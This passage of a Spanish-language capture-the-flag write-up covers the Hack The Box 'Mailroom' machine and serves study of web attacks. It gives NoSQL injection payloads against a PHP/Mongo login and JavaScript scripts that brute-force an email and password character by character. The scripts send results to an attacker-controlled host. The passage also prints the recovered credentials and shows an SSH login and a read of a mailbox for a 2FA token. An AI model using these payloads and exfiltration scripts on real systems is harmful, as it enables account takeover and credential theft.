+<p>El formulario envia una peticion a <code class="language-plaintext highlighter-rouge">auth.php</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">index.php</code></p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">fetch('/auth.php', {
+        method: 'POST',
+        body: new URLSearchParams(new FormData(form)),
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      }).then(response =&gt; {
+        return response.json();
+
+      }).then(data =&gt; {
+        // Display the name and message in the page
+        document.getElementById('message').textContent = data.message;
+        document.getElementById('password').value = '';
+        document.getElementById('message').removeAttribute("hidden");
+      }).catch(error =&gt; {
+        // Display an error message
+        //alert('Error: ' + error);
+      });</code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">auth.php</code> contiene el codigo que maneja el inicio de sesion.</p>
+
+<p>Utiliza una base de datos Mongo.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MongoDB\Client</span><span class="p">(</span><span class="s2">"mongodb://mongodb:27017"</span><span class="p">);</span></code></pre></figure>
+
+<p>Obtiene todos los usuarios registrados.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nv">$collection</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="n">backend_panel</span><span class="o">-&gt;</span><span class="n">users</span><span class="p">;</span></code></pre></figure>
+
+<p>Verifica si existe email, password por el metodo POST, que sean de tipo string, luego guarda en la variable $user el valor que retorne la base de datos si email, password existen.</p>
+
+<p>El problema aqui esque no utiliza die() o exit para finalizar con la ejecucion del codigo y la conexion, despues de enviar el header de estado <code class="language-plaintext highlighter-rouge">'HTTP/1.1 401 Unauthorized</code>.</p>
+
+<p>Osea podemos enviar arrays y el codigo continuaria procesando nuestra solicitud.</p>
+
+<p>Esto nos permite realizar consultas como <code class="language-plaintext highlighter-rouge">email[]=notexists&amp;password[]=notexists</code> o aprovechandonos de Nosql injection <code class="language-plaintext highlighter-rouge">email[$ne]=notexists&amp;password[$ne]=notexists</code></p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s1">'HTTP/1.1 401 Unauthorized'</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">([</span><span class="s1">'success'</span> <span class="o">=&gt;</span> <span class="kc">false</span><span class="p">,</span> <span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="s1">'Invalid input detected'</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Check if the email and password are correct</span>
+    <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$collection</span><span class="o">-&gt;</span><span class="nf">findOne</span><span class="p">([</span><span class="s1">'email'</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">],</span> <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]]);</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
+<span class="p">[</span><span class="mf">...</span><span class="n">cortado</span><span class="mf">...</span><span class="p">]</span></code></pre></figure>
+
+<p>Si el email y password son validos(existen en la base de datos), envia un token al email, el cual utiliza como mecanismo de autenticacion.</p>
+
+<p>Si logramos obtener las credenciales de algun usuario valido de todas formas no podremos autenticarnos en la web.</p>
+
+<p>Si leemos /var/mail/{user} y obtenemos el token ahí si podremos autenticarnos.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">echo</span> <span class="nb">json_encode</span><span class="p">([</span><span class="s1">'success'</span> <span class="o">=&gt;</span> <span class="kc">true</span><span class="p">,</span> <span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="s1">'Check your inbox for an email with your 2FA token'</span><span class="p">]);</span>
+    <span class="k">exit</span><span class="p">;</span>
+
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="c1">// Return a JSON error response</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">'HTTP/1.1 401 Unauthorized'</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">([</span><span class="s1">'success'</span> <span class="o">=&gt;</span> <span class="kc">false</span><span class="p">,</span> <span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="s1">'Invalid email or password'</span><span class="p">]);</span>
+  <span class="p">}</span></code></pre></figure>
+
+<h3 id="csrf---nosql-injection"><strong>CSRF - NOSQL injection</strong></h3>
+
+<p>Confirmamos si nos devuelve “Check your inbox for an email with your 2FA token”.</p>
+
+<p><code class="language-plaintext highlighter-rouge">pwn.js</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">const</span> <span class="nx">l1nvx</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.10.14.189:8000</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://staff-review-panel.mailroom.htb</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="kd">function</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+        <span class="c1">// NOSQL</span>
+        <span class="kd">const</span> <span class="nx">body</span> <span class="o">=</span> <span class="s2">`email[$ne]=notexists&amp;password[$ne]=notexists`</span><span class="p">;</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">DONE</span><span class="p">)</span> <span class="p">{</span>
+                <span class="c1">// Enviar el contenido</span>
+                <span class="kd">const</span> <span class="nx">req_</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+                <span class="nx">req_</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="s2">`</span><span class="p">${</span><span class="nx">l1nvx</span><span class="p">}</span><span class="s2">/?data=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)}</span><span class="s2">`</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+                <span class="nx">req_</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="s2">`</span><span class="p">${</span><span class="nx">url</span><span class="p">}</span><span class="s2">/auth.php`</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">body</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Enviar error</span>
+        <span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="s2">`</span><span class="p">${</span><span class="nx">l1nvx</span><span class="p">}</span><span class="s2">/?error=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">error</span><span class="p">)}</span><span class="s2">`</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nf">main</span><span class="p">();</span></code></pre></figure>
+
+<p>Nos devuelve decodificado:</p>
+
+<p>{“success”:false,”message”:”Invalid input detected”}{“success”:true,”message”:”Check your inbox for an email with your 2FA token”}</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">10.10.11.209 - - <span class="o">[</span>13/Aug/2023 21:44:25] <span class="s2">"GET /?data=%7B%22success%22%3Afalse%2C%22message%22%3A%22Invalid%20input%20detected%22%7D%7B%22success%22%3Atrue%2C%22message%22%3A%22Check%20your%20inbox%20for%20an%20email%20with%20your%202FA%20token%22%7D HTTP/1.1"</span> 200 -</code></pre></figure>
+
+<p>NOSQL Injection es valido.</p>
+
+<p>El siguiente script funciona hasta cierto tiempo, el usuario no alcanza a recorrer toda la string de caracteres, por lo que obtener todo el email no seria posible de un solo tiro, habra que ir acortando la string de caracteres.</p>
+
+<p>Por alguna razon no logre hacer funcionar <code class="language-plaintext highlighter-rouge">fetch</code> ni funciones <code class="language-plaintext highlighter-rouge">async</code>.</p>
+
+<p>Recorre cada caracter y por cada caracter envia una peticion <code class="language-plaintext highlighter-rouge">nosql - regex</code> al subdominio y el resultado lo envia a nuestro servidor.</p>
+
+<p><code class="language-plaintext highlighter-rouge">pwn.js</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">const</span> <span class="nx">l1nvx</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.10.14.189:8000</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://staff-review-panel.mailroom.htb</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">function</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">chars</span> <span class="o">=</span> <span class="s2">`0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_</span><span class="se">\`</span><span class="s2">{|}~`</span><span class="p">;</span>
+        <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">char</span> <span class="k">of</span> <span class="nx">chars</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nf">nosql</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">char</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="s2">`</span><span class="p">${</span><span class="nx">l1nvx</span><span class="p">}</span><span class="s2">/?error=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">error</span><span class="p">)}</span><span class="s2">`</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nf">nosql</span><span class="p">(</span><span class="nx">char</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+    <span class="kd">const</span> <span class="nx">req_</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+    <span class="kd">const</span> <span class="nx">know</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+    <span class="kd">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">know</span><span class="p">}${</span><span class="nx">char</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+    <span class="kd">const</span> <span class="nx">body</span> <span class="o">=</span> <span class="s2">`email[$regex]=^</span><span class="p">${</span><span class="nx">payload</span><span class="p">}</span><span class="s2">&amp;password[$ne]=l1nvx`</span><span class="p">;</span>
+    <span class="kd">let</span> <span class="nx">status</span><span class="p">;</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">DONE</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nx">status</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nx">status</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">false</span><span class="dl">"</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="nx">req_</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="s2">`</span><span class="p">${</span><span class="nx">l1nvx</span><span class="p">}</span><span class="s2">/?char=</span><span class="p">${</span><span class="nx">char</span><span class="p">}</span><span class="s2">&amp;status=</span><span class="p">${</span><span class="nx">status</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+            <span class="nx">req_</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="s2">`</span><span class="p">${</span><span class="nx">url</span><span class="p">}</span><span class="s2">/auth.php`</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">body</span><span class="p">);</span>
+
+<span class="p">}</span>
+<span class="nf">main</span><span class="p">();</span></code></pre></figure>
+
+<h4 id="nosql---exfil-email"><strong>Nosql - Exfil (email)</strong></h4>
+
+<p>La primera letra del campo email es <code class="language-plaintext highlighter-rouge">t</code>.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:29:21] <span class="s2">"GET /?char=t&amp;status=true HTTP/1.1"</span> 200 -</code></pre></figure>
+
+<p>Modificamos “know” para añadir la letra <code class="language-plaintext highlighter-rouge">t</code>
+<code class="language-plaintext highlighter-rouge">pwn.js</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">const</span> <span class="nx">know</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">t</span><span class="dl">"</span><span class="p">;</span></code></pre></figure>
+
+<p>Ahora obtenemos esta salida en nuestro servidor web.</p>
+
+<p>Eliminamos la string de caracteres desde 0-q porque ninguno coincide con el segundo caracter del email.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:32] <span class="s2">"GET /?char=t0&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:32] <span class="s2">"GET /?char=t1&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:33] <span class="s2">"GET /?char=t2&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:34] <span class="s2">"GET /?char=t3&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:35] <span class="s2">"GET /?char=t4&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:36] <span class="s2">"GET /?char=t5&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:37] <span class="s2">"GET /?char=t6&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:37] <span class="s2">"GET /?char=t7&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:38] <span class="s2">"GET /?char=t8&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:38] <span class="s2">"GET /?char=t9&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:39] <span class="s2">"GET /?char=ta&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:40] <span class="s2">"GET /?char=tb&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:41] <span class="s2">"GET /?char=tc&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:42] <span class="s2">"GET /?char=td&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:42] <span class="s2">"GET /?char=te&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:43] <span class="s2">"GET /?char=tf&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:44] <span class="s2">"GET /?char=tg&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:44] <span class="s2">"GET /?char=th&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:45] <span class="s2">"GET /?char=ti&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:46] <span class="s2">"GET /?char=tj&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:47] <span class="s2">"GET /?char=tk&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:48] <span class="s2">"GET /?char=tl&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:49] <span class="s2">"GET /?char=tm&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:49] <span class="s2">"GET /?char=tn&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:51] <span class="s2">"GET /?char=to&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:51] <span class="s2">"GET /?char=tp&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 16:54:52] <span class="s2">"GET /?char=tq&amp;status=false HTTP/1.1"</span> 200 -</code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">pwn.js</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">const</span> <span class="nx">chars</span> <span class="o">=</span> <span class="s2">`rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;'`</span><span class="p">;</span></code></pre></figure>
+
+<p>El segundo caracter del campo email es <code class="language-plaintext highlighter-rouge">r</code>.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">10.10.11.209 - - <span class="o">[</span>13/Aug/2023 17:01:38] <span class="s2">"GET /?char=tr&amp;status=true HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 17:01:39] <span class="s2">"GET /?char=ts&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 17:01:40] <span class="s2">"GET /?char=tt&amp;status=false HTTP/1.1"</span> 200 -
+10.10.11.209 - - <span class="o">[</span>13/Aug/2023 17:01:41] <span class="s2">"GET /?char=tu&amp;status=false HTTP/1.1"</span> 200 -</code></pre></figure>
+
+<p>Seguimos asi consecutivamente y obtendremos el valor del campo email <code class="language-plaintext highlighter-rouge">tristan@mailroom.htb</code>.</p>
+
+<h4 id="nosql---exfil-password"><strong>Nosql - Exfil (password)</strong></h4>
+
+<p>Despues de descubrir el campo email, tratemos de obtener su contraseña.</p>
+
+<p>Solo hacemos esta modificacion (ademas de ir añadiendo y eliminando caracteres de la string <code class="language-plaintext highlighter-rouge">chars</code> y <code class="language-plaintext highlighter-rouge">know</code> posteriormente).</p>
+
+<p><code class="language-plaintext highlighter-rouge">pwn.js</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">const</span> <span class="nx">know</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">body</span> <span class="o">=</span> <span class="s2">`email=tristan@mailroom.htb&amp;password[$regex]=^</span><span class="p">${</span><span class="nx">payload</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span></code></pre></figure>
+
+<p>Primer caracter <code class="language-plaintext highlighter-rouge">6</code>.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">10.10.11.209 - - <span class="o">[</span>13/Aug/2023 17:10:44] <span class="s2">"GET /?char=6&amp;status=true HTTP/1.1"</span> 200 -</code></pre></figure>
+
+<p>Seguimos añadiendo cada caracter que nos devuelva true y finalmente obtenemos. <code class="language-plaintext highlighter-rouge">69trisRulez!</code></p>
+
+<p>Iniciar sesion en <code class="language-plaintext highlighter-rouge">git.mailroom.htb</code> nos devuelve un codigo de estado 500.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/gitea-500.png" alt="500" /></p>
+
+<p>Introduciendo una diferente contraseña nos devuelve.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/gitea-password.png" alt="gitea-password" /></p>
+
+<p>Podemos autenticarnos en ssh.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → sshpass <span class="nt">-p</span> <span class="s1">'69trisRulez!'</span> ssh tristan@mailroom.htb
+Welcome to Ubuntu 20.04.6 LTS <span class="o">(</span>GNU/Linux 5.4.0-146-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 14 Aug 2023 02:00:23 AM UTC
+<span class="o">[</span>...cortado...]</code></pre></figure>
+
+<h4 id="usertxt"><strong>User.txt</strong></h4>
+
+<p>Podemos ver el <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> header que me permite mostrar su contenido, una vez dentro de la maquina.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">tristan@mailroom:~<span class="nv">$ </span>curl <span class="nt">--head</span> <span class="nt">--url</span> http://staff-review-panel.mailroom.htb
+HTTP/1.1 200 OK
+Date: Mon, 14 Aug 2023 04:10:51 GMT
+Server: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
+X-Powered-By: PHP/7.4.33
+Set-Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>a77db7dd220c93adfb62a87006c52a58<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Access-Control-Allow-Origin: <span class="k">*</span>
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8</code></pre></figure>
+
+<p>Leyendo nuestro correo, vemos el token para autenticarnos.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">tristan@mailroom:~<span class="nv">$ </span><span class="nb">cat</span> /var/mail/tristan
+Return-Path: &lt;noreply@mailroom.htb&gt;
+X-Original-To: tristan@mailroom.htb
+Delivered-To: tristan@mailroom.htb
+Received: from localhost <span class="o">(</span>unknown <span class="o">[</span>172.19.0.5]<span class="o">)</span>
+        by mailroom.localdomain <span class="o">(</span>Postfix<span class="o">)</span> with SMTP <span class="nb">id </span>66C111D09
+        <span class="k">for</span> &lt;tristan@mailroom.htb&gt;<span class="p">;</span> Mon, 14 Aug 2023 01:44:23 +0000 <span class="o">(</span>UTC<span class="o">)</span>
+Subject: 2FA
+
+Click on this <span class="nb">link </span>to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token<span class="o">=</span>50b452a6c7c7e3a5858e40ce5ac37954</code></pre></figure>
+
+<p>La web principal se ejecuta con Apache2, pero Apache2 no existe dentro de ssh.</p>
+
+<p>Viendo los servicios vemos un docker-compose-app.service, y es altamente probable que se ejecute el servidor de Apache2 en un contenedor.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">tristan@mailroom:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/systemd/system
+total 68
+drwxr-xr-x 16 root root 4096 Mar 14 11:41 <span class="nb">.</span>
+drwxr-xr-x  5 root root 4096 Mar 25 19:10 ..
+lrwxrwxrwx  1 root root   40 Aug 31  2022 dbus-org.freedesktop.ModemManager1.service -&gt; /lib/systemd/system/ModemManager.service
+lrwxrwxrwx  1 root root   44 Aug 31  2022 dbus-org.freedesktop.resolve1.service -&gt; /lib/systemd/system/systemd-resolved.service
+lrwxrwxrwx  1 root root   36 Jan 15  2023 dbus-org.freedesktop.thermald.service -&gt; /lib/systemd/system/thermald.service
+lrwxrwxrwx  1 root root   45 Aug 31  2022 dbus-org.freedesktop.timesync1.service -&gt; /lib/systemd/system/systemd-timesyncd.service
+drwxr-xr-x  2 root root 4096 Jan 19  2023 default.target.wants
+<span class="nt">-rw-r--r--</span>  1 root root  311 Jan 15  2023 docker-compose-app.service
+drwxr-xr-x  2 root root 4096 Jan 15  2023 emergency.target.wants
+drwxr-xr-x  2 root root 4096 Aug 31  2022 getty.target.wants
+drwxr-xr-x  2 root root 4096 Aug 31  2022 graphical.target.wants
+lrwxrwxrwx  1 root root   38 Aug 31  2022 iscsi.service -&gt; /lib/systemd/system/open-iscsi.service
+drwxr-xr-x  2 root root 4096 Aug 31  2022 mdmonitor.service.wants
+lrwxrwxrwx  1 root root   38 Aug 31  2022 multipath-tools.service -&gt; /lib/systemd/system/multipathd.service
+drwxr-xr-x  2 root root 4096 Mar 25 18:43 multi-user.target.wants
+drwxr-xr-x  2 root root 4096 Mar 14 11:40 network-online.target.wants
+drwxr-xr-x  2 root root 4096 Aug 31  2022 open-vm-tools.service.requires
+drwxr-xr-x  2 root root 4096 Aug 31  2022 paths.target.wants
+drwxr-xr-x  2 root root 4096 Jan 15  2023 rescue.target.wants
+drwxr-xr-x  2 root root 4096 Jan 15  2023 sleep.target.wants
+drwxr-xr-x  2 root root 4096 Jan 19  2023 sockets.target.wants
+lrwxrwxrwx  1 root root   31 Jan 15  2023 sshd.service -&gt; /lib/systemd/system/ssh.service
+drwxr-xr-x  2 root root 4096 Aug 31  2022 sysinit.target.wants
+lrwxrwxrwx  1 root root   35 Aug 31  2022 syslog.service -&gt; /lib/systemd/system/rsyslog.service
+drwxr-xr-x  2 root root 4096 Jan 19  2023 timers.target.wants
+lrwxrwxrwx  1 root root   41 Aug 31  2022 vmtoolsd.service -&gt; /lib/systemd/system/open-vm-tools.service
